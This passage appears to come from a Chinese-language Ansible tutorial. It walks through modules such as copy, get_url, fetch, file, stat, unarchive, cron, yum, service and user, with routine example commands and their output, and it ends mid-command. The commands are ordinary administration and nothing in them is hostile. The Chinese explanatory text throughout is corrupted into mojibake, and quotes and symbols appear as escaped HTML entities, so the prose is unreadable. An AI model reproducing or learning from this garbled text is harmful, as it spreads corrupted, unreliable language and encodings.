å½“ FILE å­˜åœ¨æ—¶ï¼Œæ‰§è¡Œæ“ä½œ\tèŒƒä¾‹ï¼š\n# å‡†å¤‡ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ [root@ansible ~]# cat test.sh echo hello # è¯¥æ–‡ä»¶æ— æ‰§è¡Œæƒé™ [root@ansible ~]# ll test.sh -rw-r--r--. 1 root root 11 Jun 20 15:44 test.sh # é€šè¿‡ scriptæ¨¡å— åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œè¯¥è„šæœ¬ [root@ansible ~]# ansible remote -m script -a \u0026#39;test.sh\u0026#39; remote | CHANGED =\u0026gt; { \u0026#34;changed\u0026#34;: true, \u0026#34;rc\u0026#34;: 0, \u0026#34;stderr\u0026#34;: \u0026#34;Shared connection to 192.168.0.134 closed.\\r\\n\u0026#34;, \u0026#34;stderr_lines\u0026#34;: [ \u0026#34;Shared connection to 192.168.0.134 closed.\u0026#34; ], \u0026#34;stdout\u0026#34;: \u0026#34;hello\\r\\n\u0026#34;, \u0026#34;stdout_lines\u0026#34;: [ \u0026#34;hello\u0026#34; ] } 2.4.4 copy æ¨¡å— æ­¤æ¨¡å—ç”¨äºæ–‡ä»¶æ‹·è´ï¼Œæœ‰ä¸¤ç§ç”¨æ³•ï¼š\nå°† ansible ä¸»æœºä¸Šçš„æ–‡ä»¶æ‹·è´åˆ°å—æ§èŠ‚ç‚¹ å°†å—æ§èŠ‚ç‚¹çš„æ–‡ä»¶æ‹·è´åˆ°å—æ§èŠ‚ç‚¹çš„å…¶ä»–è·¯å¾„ å¸¸è§é€‰é¡¹\nsrc # æ§åˆ¶ç«¯çš„æºæ–‡ä»¶è·¯å¾„ dest # è¢«æ§ç«¯çš„æ–‡ä»¶è·¯å¾„ owner # å±ä¸» group # å±ç»„ mode # æƒé™ backup # æ˜¯å¦å¤‡ä»½ validate # éªŒè¯æˆåŠŸæ‰ä¼šæ‰§è¡Œcopy remote_src # no æ˜¯é»˜è®¤å€¼, è¡¨ç¤º src æ–‡ä»¶åœ¨ ansible ä¸»æœº, yesè¡¨ç¤º src æ–‡ä»¶åœ¨è¿œç¨‹ä¸»æœº èŒƒä¾‹ï¼š\n# åˆ›å»ºlocal.txt å¹¶å°†å…¶æ‹·è´åˆ° remote ä¸»æœºä¸Š [root@ansible ~]# touch local.txt [root@ansible ~]# ansible remote -m copy -a \u0026#39;src=local.txt dest=/tmp/remote.txt owner=test mode=600\u0026#39; # æˆåŠŸæ‹·è´åˆ° remote ä¸»æœº [root@ansible ~]# ansible remote -a \u0026#39;ls /tmp/remote.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/remote.txt # ä¿®æ”¹local.txt æ–‡ä»¶å†…å®¹ï¼Œå†æ¬¡æ‰§è¡Œæ‹·è´æ“ä½œ [root@ansible ~]# echo hello \u0026gt;\u0026gt; local.txt # å½“æ–‡ä»¶å†…å®¹å˜åŒ–ï¼Œä¸” backup=yes æ—¶ï¼Œä¼šåœ¨æ‹·è´æ“ä½œæ‰§è¡Œå‰ï¼Œåœ¨ç›®æ ‡ä¸»æœºç”Ÿæˆä¸€ä¸ªä»¥æ—¶é—´æˆ³ä¸ºåç¼€çš„å¤‡ä»½æ–‡ä»¶ï¼Œå¦‚ï¼šremote.txt.9235.2023-06-20@16:52:58~ [root@ansible ~]# ansible remote -a \u0026#34;ls /tmp\u0026#34; remote | CHANGED | rc=0 \u0026gt;\u0026gt; ansible_command_payload_QQiJzZ remote.txt remote.txt.9235.2023-06-20@16:52:58~ # æ‹·è´ remote ä¸»æœºçš„æ–‡ä»¶åˆ°æŒ‡å®šè·¯å¾„ï¼Œremote_src è¡¨ç¤ºæºæ–‡ä»¶åœ¨ç›®æ ‡ä¸»æœºä¸Š [root@ansible ~]# ansible remote -m copy -a \u0026#34;src=/tmp/remote.txt dest=/tmp/local.txt owner=test mode=600 remote_src=yes\u0026#34; # æˆåŠŸåœ¨ remote ä¸»æœºçš„ /tmp ç›®å½•ä¸‹ å¤åˆ¶äº†ä¸€ä¸ª local.txt æ–‡ä»¶ [root@ansible ~]# ansible remote -a \u0026#34;ls /tmp/local.txt\u0026#34; remote | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/local.txt # ç›´æ¥æŒ‡å®šæ–‡ä»¶å†…å®¹ï¼Œç”Ÿæˆæ–‡ä»¶ [root@ansible ~]# ansible remote -m copy -a \u0026#39;content=\u0026#34;hello\\nworld\\n\u0026#34; dest=/tmp/hello.txt\u0026#39; [root@ansible ~]# ansible remote -a \u0026#39;cat /tmp/hello.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; hello world #### æ‹·è´æ•´ä¸ªæ–‡ä»¶å¤¹ /tmp åˆ° remote ä¸»æœºã€‚æ³¨æ„ï¼šæ˜¯ /tmp è€Œé /tmp/ [root@ansible ~]# ansible remote -m copy -a \u0026#39;src=/tmp dest=/tmp/\u0026#39; [root@ansible ~]# ansible remote -a \u0026#39;ls -d /tmp/tmp\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; /tmp/tmp ### æ‹·è´/tmp æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶åˆ°ç›®æ ‡ä¸»æœº # æå‰åœ¨ç›®æ ‡ä¸»æœºæ–°å»ºä¸€ä¸ªç©ºæ–‡ä»¶å¤¹ç”¨äºå­˜æ”¾ /tmp ç›®å½•ä¸‹çš„æ–‡ä»¶ [root@remote ~]# ls -d /test/ /test/ # åœ¨ /tmp æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ª test.txt æ–‡ä»¶ [root@ansible ~]# ls /tmp/test.txt /tmp/test.txt # æ‰§è¡Œæ‹·è´æ“ä½œï¼Œè§‚å¯Ÿåˆ°æˆåŠŸæ‹·è´ /tmp æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶åˆ°ç›®æ ‡ä¸»æœº [root@ansible ~]# ansible remote -m copy -a \u0026#39;src=/tmp/ dest=/test\u0026#39; [root@ansible ~]# ansible remote -a \u0026#39;ls /test\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; test.txt # å¤åˆ¶æ–‡ä»¶å¹¶æ‰§è¡Œæ ¡éªŒå‘½ä»¤ï¼Œæ³¨æ„ï¼š%s æ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œå°†åœ¨å‘½ä»¤æ‰§è¡Œæ—¶è¢«æ›¿æ¢ä¸ºæºæ–‡ä»¶çš„è·¯å¾„ã€‚ [root@ansible ~]# ansible remote -m copy -a \u0026#34;src=/etc/sudoers dest=/etc/sudoers.bak remote_src=yes validate=\u0026#39;/usr/sbin/visudo -csf %s\u0026#39;\u0026#34; 2.4.5 get_url æ¨¡å— æ­¤æ¨¡å—ä½¿ç”¨ httpã€https æˆ– ftp åè®®ä¸‹è½½æ–‡ä»¶\nå¸¸ç”¨å‚æ•°ï¼š\nurl # ä¸‹è½½æ–‡ä»¶çš„URL,æ”¯æŒ HTTPï¼ŒHTTPS æˆ– FTP åè®® dest # ä¸‹è½½åˆ°ç›®æ ‡è·¯å¾„ï¼ˆç»å¯¹è·¯å¾„ï¼‰ï¼Œå¦‚æœç›®æ ‡æ˜¯ä¸€ä¸ªç›®å½•ï¼Œå°±ç”¨åŸæ–‡ä»¶åï¼Œå¦‚æœç›®æ ‡è®¾ç½®äº†åç§°å°±ç”¨ç›®æ ‡è®¾ç½®çš„åç§° owner # æŒ‡å®šå±ä¸» group # æŒ‡å®šå±ç»„ mode # æŒ‡å®šæƒé™ force # å¦‚æœ yesï¼Œdest ä¸æ˜¯ç›®å½•ï¼Œå°†æ¯æ¬¡ä¸‹è½½æ–‡ä»¶ï¼Œå¦‚æœå†…å®¹æ”¹å˜æ›¿æ¢æ–‡ä»¶ã€‚å¦‚æœ noï¼Œåˆ™åªæœ‰åœ¨ç›®æ ‡ä¸å­˜åœ¨æ—¶æ‰ä¼šä¸‹è½½ï¼Œé»˜è®¤ï¼šno checksum # å¯¹ç›®æ ‡æ–‡ä»¶åœ¨ä¸‹è½½åè®¡ç®—æ‘˜è¦ï¼Œä»¥ç¡®ä¿å…¶å®Œæ•´æ€§ # ç¤ºä¾‹: # checksum=\u0026#34;sha256:D98291AC[...]B6DC7B97\u0026#34;, # checksum=\u0026#34;sha256:http://example.com/path/sha256sum.txt\u0026#34; url_username # ç”¨äºHTTPåŸºæœ¬è®¤è¯çš„ç”¨æˆ·åã€‚ å¯¹äºå…è®¸ç©ºå¯†ç çš„ç«™ç‚¹ï¼Œæ­¤å‚æ•°å¯ä»¥ä¸ä½¿ç”¨ `url_password\u0026#39; url_password # ç”¨äºHTTPåŸºæœ¬è®¤è¯çš„å¯†ç ã€‚ å¦‚æœæœªæŒ‡å®š`url_username\u0026#39;å‚æ•°ï¼Œåˆ™ä¸ç”Ÿæ•ˆ `url_password\u0026#39;å‚æ•° validate_certs # å¦‚æœâ€œnoâ€ï¼ŒSSLè¯ä¹¦å°†ä¸ä¼šè¢«éªŒè¯ã€‚ é€‚ç”¨äºè‡ªç­¾åè¯ä¹¦åœ¨ç§æœ‰ç½‘ç«™ä¸Šä½¿ç”¨ timeout # URLè¯·æ±‚çš„è¶…æ—¶æ—¶é—´,ç§’ä¸ºå•ä½ èŒƒä¾‹ï¼š\n# ä¸‹è½½ nginx è‡³ remote ä¸»æœºï¼Œå¹¶æ ¡éªŒ md5 å€¼ [root@ansible ~]# ansible remote -m get_url -a \u0026#39;url=http://nginx.org/download/nginx-1.18.0.tar.gz dest=/usr/local/src checksum=\u0026#34;md5:b2d33d24d89b8b1f87ff5d251aa27eb8\u0026#34;\u0026#39; # ä¸‹è½½æˆåŠŸ [root@ansible ~]# ansible remote -a \u0026#39;ls /usr/local/src/\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; nginx-1.18.0.tar.gz 2.4.6 fetch æ¨¡å— æ­¤æ¨¡å—å¯ä»¥å°†å—æ§èŠ‚ç‚¹çš„æ–‡ä»¶æ‹‰å–è‡³ ansible ä¸»æ§ç«¯ï¼Œå’Œ copy æ¨¡å—åŠŸèƒ½ç›¸åï¼Œç›®å‰ä¸æ”¯æŒæ‹‰å–ç›®å½•\nå¸¸è§é€‰é¡¹\nsrc # å—æ§èŠ‚ç‚¹æºæ–‡ä»¶è·¯å¾„ dest # ansible ä¸»æ§ç«¯ç›®å½•è·¯å¾„ èŒƒä¾‹ï¼š\n# å¦‚æœåŒæ—¶æ‹‰å–å¤šå°ä¸»æœºçš„åŒä¸€æ–‡ä»¶ï¼Œansible ä¼šä¸ºæ¯å°ä¸»æœºå»ºç«‹å•ç‹¬çš„æ–‡ä»¶å¤¹æ¥å­˜æ”¾æ‹‰å–çš„æ–‡ä»¶ [root@ansible ~]# ansible all --list-hosts hosts (2): remote remote2 # å°†è¿œç¨‹ä¸»æœºçš„redhat-release æ–‡ä»¶æ‹‰å–è‡³ ansible ä¸»æœºçš„ /tmp/osç›®å½•ä¸‹ï¼ˆç›®å½•ä¼šè‡ªåŠ¨åˆ›å»ºï¼‰ [root@ansible ~]# ansible all -m fetch -a \u0026#39;src=/etc/redhat-release dest=/tmp/os/\u0026#39; [root@ansible ~]# tree /tmp/os/ /tmp/os/ â”œâ”€â”€ remote â”‚ â””â”€â”€ etc â”‚ â””â”€â”€ redhat-release â””â”€â”€ remote2 â””â”€â”€ etc â””â”€â”€ redhat-release 4 directories, 2 files 2.4.7 file æ¨¡å— æ­¤æ¨¡å—ç”¨äºåˆ›å»ºï¼Œåˆ é™¤æ–‡ä»¶ï¼Œç›®å½•å’Œè½¯è¿æ¥ä»¥åŠä¿®æ”¹ç›¸å…³å±æ€§\nå¸¸è§é€‰é¡¹\npath # åœ¨è¢«æ§ç«¯åˆ›å»ºçš„è·¯å¾„ owner # å±ä¸» group # å±ç»„ mode # æƒé™ state # çŠ¶æ€ =touch # åˆ›å»ºæ–‡ä»¶ =directory # åˆ›å»ºç›®å½• =link # è½¯é“¾æ¥ =hard # ç¡¬é“¾æ¥ recurse # yes è¡¨ç¤ºé€’å½’æˆæƒ èŒƒä¾‹ï¼š\n# åˆ›å»ºæ–‡ä»¶å¹¶ä¿®æ”¹å±ä¸» [root@ansible ~]# ansible remote -m file -a \u0026#39;path=/tmp/file.txt state=touch owner=test mode=755\u0026#39; # åˆ é™¤æ–‡ä»¶ [root@ansible ~]# ansible remote -m file -a \u0026#39;path=/tmp/file.txt state=absent\u0026#39; # åˆ›å»ºè½¯è¿æ¥ï¼Œå…¶ä¸­ dest è¿˜å¯ä»¥æ›¿æ¢ä¸º[ path | name ] [root@ansible ~]# ansible remote -m file -a \u0026#39;src=/etc/redhat-release dest=/tmp/release-link state=link\u0026#39; [root@ansible ~]# ansible remote -a \u0026#39;cat /tmp/release-link\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; CentOS Linux release 7.6.1810 (Core) # åˆ›å»ºç›®å½• [root@ansible ~]# ansible remote -m file -a \u0026#39;path=/tmp/dir state=directory\u0026#39; # é€’å½’ä¿®æ”¹æ–‡ä»¶å±æ€§ [root@ansible ~]# ansible remote -m file -a \u0026#39;path=/tmp owner=test group=test recurse=yes\u0026#39; 2.4.8 stat æ¨¡å— æ­¤æ¨¡å—ç”¨äºæ£€æŸ¥æ–‡ä»¶æˆ–æ–‡ä»¶ç³»ç»ŸçŠ¶æ€\nansible.builtin.stat module â€“ Retrieve file or file system status â€” Ansible Documentation\nå¸¸è§é€‰é¡¹\npath # æ–‡ä»¶æˆ–å¯¹è±¡çš„å®Œæ•´è·¯å¾„ï¼ˆå¿…é¡»ï¼‰ å¸¸è§è¿”å›å€¼ï¼š\nattributesï¼š# è¿”å›æŒ‡å®šæ–‡ä»¶çš„å±æ€§ã€‚ executableï¼š# å¦‚æœè°ƒç”¨çš„ç”¨æˆ·åœ¨ç›®æ ‡è·¯å¾„ä¸Šæœ‰æ‰§è¡Œæƒé™ï¼Œåˆ™è¿”å› trueã€‚ existsï¼š\t# å¦‚æœæŒ‡å®šçš„è·¯å¾„å­˜åœ¨ï¼Œè¿”å›çœŸã€‚ gr_nameï¼š# è¿”å›æ–‡ä»¶æ‰€æœ‰è€…çš„ç»„çš„åç§°ã€‚ islbkï¼š\t# å¦‚æœæŒ‡å®šçš„æ–‡ä»¶æ˜¯ä¸€ä¸ªå—çŠ¶è®¾å¤‡ï¼Œåˆ™è¿”å›trueã€‚ ischrï¼š # å¦‚æœæŒ‡å®šçš„æ–‡ä»¶æ˜¯ä¸€ä¸ªå­—ç¬¦æ–‡ä»¶ï¼Œåˆ™è¿”å›çœŸã€‚ isregï¼š\t# å¦‚æœæŒ‡å®šçš„æ–‡ä»¶æ˜¯ä¸€ä¸ªå¸¸è§„æ–‡ä»¶ï¼Œåˆ™è¿”å›çœŸã€‚ isdirï¼š\t# å¦‚æœæŒ‡å®šçš„æ–‡ä»¶æ˜¯ä¸€ä¸ªç›®å½•ï¼Œåˆ™è¿”å›çœŸã€‚ islnkï¼š\t# å¦‚æœç›®æ ‡æ–‡ä»¶æ˜¯ä¸€ä¸ªé“¾æ¥ï¼Œåˆ™è¿”å›çœŸã€‚ modeï¼š\t# ä»¥å…«è¿›åˆ¶ç¬¦å·è¿”å›æ–‡ä»¶æƒé™ã€‚ isuidï¼š # isuid è¡¨ç¤º \u0026#34;is setuid\u0026#34;ï¼Œç”¨äºåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å…·æœ‰è®¾ç½®ç”¨æˆ· ID (Set User IDï¼ŒSUID) æƒé™ã€‚ èŒƒä¾‹ï¼š\n[root@remote ~]# chmod a+s /etc/centos-release [root@remote ~]# ll /etc/centos-release -rwSr-Sr--. 1 root root 38 Nov 23 2018 /etc/centos-release [root@ansible ~]# ansible remote -m stat -a \u0026#39;path=/etc/centos-release\u0026#39; remote | SUCCESS =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;changed\u0026#34;: false, \u0026#34;stat\u0026#34;: { \u0026#34;atime\u0026#34;: 1687316675.220694, \u0026#34;attr_flags\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;attributes\u0026#34;: [], \u0026#34;block_size\u0026#34;: 4096, \u0026#34;blocks\u0026#34;: 8, \u0026#34;charset\u0026#34;: \u0026#34;us-ascii\u0026#34;, \u0026#34;checksum\u0026#34;: \u0026#34;dd9a53b0d396d3ab190cfbc08dca572d3e741a03\u0026#34;, \u0026#34;ctime\u0026#34;: 1687316666.4736364, \u0026#34;dev\u0026#34;: 64768, \u0026#34;device_type\u0026#34;: 0, \u0026#34;executable\u0026#34;: false, \u0026#34;exists\u0026#34;: true, \u0026#34;gid\u0026#34;: 0, \u0026#34;gr_name\u0026#34;: \u0026#34;root\u0026#34;, \u0026#34;inode\u0026#34;: 67184137, \u0026#34;isblk\u0026#34;: false, \u0026#34;ischr\u0026#34;: false, \u0026#34;isdir\u0026#34;: false, \u0026#34;isfifo\u0026#34;: false, \u0026#34;isgid\u0026#34;: true, \u0026#34;islnk\u0026#34;: false, \u0026#34;isreg\u0026#34;: true, \u0026#34;issock\u0026#34;: false, \u0026#34;isuid\u0026#34;: true, \u0026#34;mimetype\u0026#34;: \u0026#34;text/plain\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;6644\u0026#34;, \u0026#34;mtime\u0026#34;: 1542979018.0, \u0026#34;nlink\u0026#34;: 1, \u0026#34;path\u0026#34;: \u0026#34;/etc/centos-release\u0026#34;, \u0026#34;pw_name\u0026#34;: \u0026#34;root\u0026#34;, \u0026#34;readable\u0026#34;: true, \u0026#34;rgrp\u0026#34;: true, \u0026#34;roth\u0026#34;: true, \u0026#34;rusr\u0026#34;: true, \u0026#34;size\u0026#34;: 38, \u0026#34;uid\u0026#34;: 0, \u0026#34;version\u0026#34;: \u0026#34;815093836\u0026#34;, \u0026#34;wgrp\u0026#34;: false, \u0026#34;woth\u0026#34;: false, \u0026#34;writeable\u0026#34;: true, \u0026#34;wusr\u0026#34;: true, \u0026#34;xgrp\u0026#34;: false, \u0026#34;xoth\u0026#34;: false, \u0026#34;xusr\u0026#34;: false } } 2.4.9 unarchive æ¨¡å— æ­¤æ¨¡å—ç”¨äºè§£åŒ…å’Œè§£å‹ç¼©ï¼Œæœ‰ä¸¤ç§ç”¨æ³•ï¼š\nå°† ansible ä¸»æœºä¸Šçš„å‹ç¼©æ–‡ä»¶è§£å‹è‡³å—æ§èŠ‚ç‚¹çš„æŒ‡å®šè·¯å¾„ä¸‹ å°†é ansible çš„å…¶ä»–ä¸»æœºçš„å‹ç¼©æ–‡ä»¶è§£å‹åˆ°å—æ§èŠ‚ç‚¹çš„æŒ‡å®šè·¯å¾„ä¸‹ å¸¸è§å‚æ•°ï¼š\nremote_src # yes è¡¨ç¤ºæºæ–‡ä»¶åœ¨è¿œç¨‹è¢«æ§ä¸»æœºæˆ–é ansible çš„å…¶å®ƒä¸»æœºä¸Šï¼Œno è¡¨ç¤ºæ–‡ä»¶åœ¨ansibleä¸»æœºä¸Š, é»˜è®¤å€¼ä¸º no, æ­¤é€‰é¡¹ä»£æ›¿copyé€‰é¡¹ï¼ˆå·²åºŸå¼ƒï¼‰ src #æºè·¯å¾„ï¼Œå¯ä»¥æ˜¯ ansible ä¸»æœºä¸Šçš„è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯è¿œç¨‹ä¸»æœº(è¢«ç®¡ç†ç«¯æˆ–è€…ç¬¬ä¸‰æ–¹ä¸»æœº)ä¸Šçš„è·¯å¾„ï¼Œå¦‚æœæ˜¯è¿œç¨‹ä¸»æœºä¸Šçš„è·¯å¾„ï¼Œåˆ™éœ€è¦è®¾ç½® remote_src=yes dest # è¿œç¨‹ä¸»æœºä¸Šçš„ç›®æ ‡è·¯å¾„ mode # è®¾ç½®è§£å‹ç¼©åçš„æ–‡ä»¶æƒé™ creates=PATH # å½“PATHä¸å­˜åœ¨æ—¶æ‰ä¼šæ‰§è¡Œ èŒƒä¾‹ï¼š\n# è§£å‹æœ¬åœ°æ–‡ä»¶åˆ°å—æ§èŠ‚ç‚¹çš„æŒ‡å®šç›®å½•ï¼ˆç›®æ ‡ç›®å½•ä¸å­˜åœ¨ä¼šæŠ¥é”™ï¼Œä¸ä¼šè‡ªåŠ¨åˆ›å»ºï¼‰ [root@ansible ~]# ansible remote -m unarchive -a \u0026#39;src=/tmp/test.tar.gz dest=/tmp/\u0026#39; # è§£å‹å…¶ä»–ä¸»æœºçš„å‹ç¼©åŒ…åˆ°å—æ§èŠ‚ç‚¹ [root@ansible ~]# ansible remote -m unarchive -a \u0026#39;src=https://releases.ansible.com/ansible/ansible-2.1.6.0-0.1.rc1.tar.gz dest=/tmp remote_src=yes\u0026#39; 2.4.10 archive æ¨¡å— æ­¤æ¨¡å—ç”¨äºåœ¨å—æ§èŠ‚ç‚¹æ‰“åŒ…å‹ç¼©æ–‡ä»¶\nå¸¸è§é€‰é¡¹\npath # å‹ç¼©çš„æ–‡ä»¶æˆ–ç›®å½• dest # å‹ç¼©åçš„æ–‡ä»¶ format # å‹ç¼©æ ¼å¼,æ”¯æŒgz,bz2,xz,tar,zip èŒƒä¾‹ï¼š\n[root@ansible tmp]# ansible remote -m archive -a \u0026#39;path=/etc/redhat-release dest=/tmp/log.tar.gz format=gz\u0026#39; 2.4.11 hostname æ¨¡å— æ­¤æ¨¡å—ç”¨äºä¿®æ”¹ä¸»æœºå\nå¸¸è§é€‰é¡¹\nname # è¦ä¿®æ”¹çš„ç›®æ ‡ä¸»æœºå èŒƒä¾‹ï¼š\n[root@ansible ~]# ansible remote -m hostname -a \u0026#39;name=test\u0026#39; 2.4.12 cron æ¨¡å— æ­¤æ¨¡å—ç”¨äºåˆ›å»ºè®¡åˆ’ä»»åŠ¡\nå¸¸è§é€‰é¡¹\nname # ä»»åŠ¡åç§°ï¼Œå¯ä»¥æ ¹æ®æ­¤åç§°åˆ é™¤å¯¹åº”çš„è®¡åˆ’ä»»åŠ¡ minute # åˆ†é’Ÿ hour # å°æ—¶ weekday # å‘¨ user\t# ä»»åŠ¡ç”±å“ªä¸ªç”¨æˆ·è¿è¡Œï¼›é»˜è®¤root job # ä»»åŠ¡ èŒƒä¾‹ï¼š\n# åˆ›å»ºä¸€ä¸ªè®¡åˆ’ä»»åŠ¡ï¼Œå‘½åä¸º test [root@ansible ~]# ansible remote -m cron -a \u0026#39;minute=0 hour=2 weekday=1-5 job=\u0026#34;echo test\u0026#34; name=hello\u0026#39; # æŸ¥çœ‹åˆ›å»ºç»“æœ [root@ansible ~]# ansible remote -a \u0026#39;crontab -l\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; #Ansible: hello 0 2 * * 1-5 echo test 2.4.13 yum å’Œ apt æ¨¡å— æ­¤æ¨¡å—ç”¨äºç®¡ç†è½¯ä»¶åŒ…\nyumï¼šé€‚ç”¨äºRHELï¼ŒCentoOSï¼ŒFedora ç­‰ç³»ç»Ÿ aptï¼šé€‚ç”¨äºDebianï¼ŒUbuntu ç­‰ç³»ç»Ÿ yum æ¨¡å—å¸¸è§é€‰é¡¹\nname # è½¯ä»¶åŒ…åç§° state # çŠ¶æ€ =present # å®‰è£…, æ­¤ä¸ºé»˜è®¤å€¼ =absent # åˆ é™¤ =latest # æœ€æ–°ç‰ˆ list # åˆ—å‡ºæŒ‡å®šåŒ… enablerepo # å¯ç”¨ä»“åº“xx disablerepo # ç¦ç”¨ä»“åº“xx exclude # æ’é™¤æŒ‡å®šçš„åŒ… validate # æ˜¯å¦æ£€éªŒ, é»˜è®¤ä¸º yes èŒƒä¾‹ï¼š\n# å®‰è£… httpd ansible remote -m yum -a \u0026#39;name=httpd state=present\u0026#39; # åˆ é™¤ httpd ansible remote -m yum -a \u0026#39;name=httpd state=absent\u0026#39; # ä»ç½‘ç»œæºå®‰è£… zabbix ï¼ˆç”±äºç¼ºå°‘å…¶ä»–ä¾èµ–åŒ…ï¼Œè¯¥å‘½ä»¤å¯èƒ½æ‰§è¡Œå¤±è´¥ï¼‰ ansible remote -m yum -a \u0026#39;name=https://mirrors.tuna.tsinghua.edu.cn/zabbix/zabbix/5.0/rhel/8/x86_64/zabbix-agent2-5.0.24-1.el8.x86_64.rpm state=present validate_certs=no\u0026#39; # å¯ç”¨ epel æºå®‰è£… nginx ansible remote -m yum -a \u0026#39;name=nginx state=present enablerepo=epel\u0026#39; # æ˜ç¡®ç¦ç”¨ epel æºä¼šå¯¼è‡´å®‰è£…å¤±è´¥ï¼ˆæ‰¾ä¸åˆ° nginx åŒ…ï¼‰ ansible remote -m yum -a \u0026#39;name=nginx state=present disablerepo=epel\u0026#39; # å®‰è£…é™¤äº† kernel* å’Œ foo* åŒ¹é…åˆ°çš„å…¶ä½™æ‰€æœ‰åŒ…ï¼ˆæµ‹è¯•ä½¿ç”¨ï¼Œè°¨æ…æ‰§è¡Œï¼‰ ansible remote -m yum -a \u0026#39;name=* state=latest exclude=kerner*,foo*\u0026#39; # åˆ—å‡ºæ‰€æœ‰ç‰ˆæœ¬çš„åŒ… ansible remote -m yum -a \u0026#39;list=tree\u0026#39; 2.4.14 yum_repository æ­¤æ¨¡å—ç”¨äº yum ä»“åº“çš„é…ç½®ç®¡ç†\nå¸¸è§é€‰é¡¹\nname # ä»“åº“idï¼Œä¹Ÿæ˜¯é…ç½®æ–‡ä»¶å description # ä»“åº“æè¿°åç§°,å¯¹åº”é…ç½®æ–‡ä»¶ä¸­çš„name= baseurl # ä»“åº“çš„åœ°å€ gpgcheck # å¼€å¯å¯†é’¥éªŒè¯ gpgkey # ä»“åº“å…¬é’¥è·¯å¾„ èŒƒä¾‹ï¼š\n# æ·»åŠ  nginx ä»“åº“ [root@ansible ~]# ansible remote -m yum_repository -a \u0026#39;name=nginx-repo description=\u0026#34;nginx repo\u0026#34; baseurl=\u0026#34;http://nginx.org/packages/centos/$releasever/$basearch/\u0026#34; gpgcheck=yes gpgkey=\u0026#34;https://nginx.org/keys/nginx_signing.key\u0026#34;\u0026#39; # æŸ¥çœ‹æ·»åŠ ç»“æœ [root@ansible ~]# ansible remote -a \u0026#39;cat /etc/yum.repos.d/nginx-repo.repo\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; [nginx-repo] baseurl = http://nginx.org/packages/centos/$releasever/$basearch/ gpgcheck = 1 gpgkey = https://nginx.org/keys/nginx_signing.key name = nginx repo # åˆ é™¤ nginx ä»“åº“ [root@ansible ~]# ansible remote -m yum_repository -a \u0026#39;name=nginx-repo state=absent\u0026#39; 2.4.15 service æ¨¡å— æ­¤æ¨¡å—å’Œ systemd çš„åŠŸèƒ½ç±»ä¼¼ï¼Œç”¨äºç®¡ç†ç³»ç»ŸæœåŠ¡\nå¸¸è§é€‰é¡¹\nname # æœåŠ¡åç§° state # æœåŠ¡çŠ¶æ€ =started # å¯åŠ¨ =stopped # åœæ­¢ =restarted # é‡å¯ =reloaded # é‡è½½ enabled # å¼€å¯è‡ªå¯åŠ¨ daemon_reload # åŠ è½½æ–°çš„é…ç½®æ–‡ä»¶,é€‚ç”¨äºsystemdæ¨¡å— èŒƒä¾‹ï¼š\n# å¯åŠ¨å¹¶è®¾ç½® httpd æœåŠ¡å¼€æœºè‡ªå¯åŠ¨ ansible remote -m service -a \u0026#39;name=httpd state=started enabled=yes\u0026#39; # å…³é—­ httpd æœåŠ¡ï¼Œå¹¶å…³é—­å¼€æœºè‡ªå¯ ansible remote -m service -a \u0026#39;name=httpd state=stopped enabled=no\u0026#39; # é‡å¯æŒ‡å®šç½‘å¡æœåŠ¡ ansible remote -m service -a \u0026#39;name=network state=restarted args=ens33\u0026#39; 2.4.16 user æ¨¡å— æ­¤æ¨¡å—ç”¨äºç”¨æˆ·ç®¡ç†\nå¸¸ç”¨é€‰é¡¹\nname # åˆ›å»ºçš„åç§° uid # æŒ‡å®š uid group # æŒ‡å®šåŸºæœ¬ç»„ shell # ç™»å½• shell ç±»å‹é»˜è®¤ /bin/bash create_home # æ˜¯å¦åˆ›å»ºå®¶ç›®å½• password # è®¾å®šå¯¹åº”çš„å¯†ç ï¼Œå¿…é¡»æ˜¯åŠ å¯†åçš„å­—ç¬¦ä¸²æ‰è¡Œï¼Œå¦åˆ™ä¸ç”Ÿæ•ˆ system # yes è¡¨ç¤ºç³»ç»Ÿç”¨æˆ· groups # é™„åŠ ç»„ append # è¿½åŠ é™„åŠ ç»„ä½¿ç”¨, yes è¡¨ç¤ºå¢åŠ æ–°çš„é™„åŠ ç»„ state # absent åˆ é™¤ remove # yes è¡¨ç¤ºåˆ é™¤ç”¨æˆ·æ—¶å°†å®¶ç›®å½•ä¸€èµ·åˆ é™¤ generate_ssh_key # åˆ›å»ºç§é’¥ ssh_keyu_bits # ç§é’¥ä½æ•° ssh_key_file # ç§é’¥æ–‡ä»¶è·¯å¾„ èŒƒä¾‹ï¼š\n# åˆ›å»ºç”¨æˆ·å¹¶æŒ‡å®šç›¸å…³å±æ€§ï¼ˆå®¶ç›®å½•ä¼šè‡ªåŠ¨åˆ›å»ºï¼‰ ansible remote -m user -a \u0026#39;name=test uid=1001 home=/app/test shell=/bin/sh\u0026#39; # åˆ›å»ºç³»ç»Ÿç”¨æˆ·ï¼ˆuid \u0026lt; 1000ï¼‰ ansible remote -m user -a \u0026#39;name=test1 home=/app/test1 shell=/bin/bash system=yes\u0026#39; # åˆ©ç”¨ debug æ¨¡å—ç”ŸæˆåŠ å¯†å¯†ç  [root@ansible ~]# ansible localhost -m debug -a \u0026#39;msg={{ \u0026#34;123456\u0026#34; | password_hash(\u0026#34;sha512\u0026#34;,\u0026#34;salt\u0026#34;) 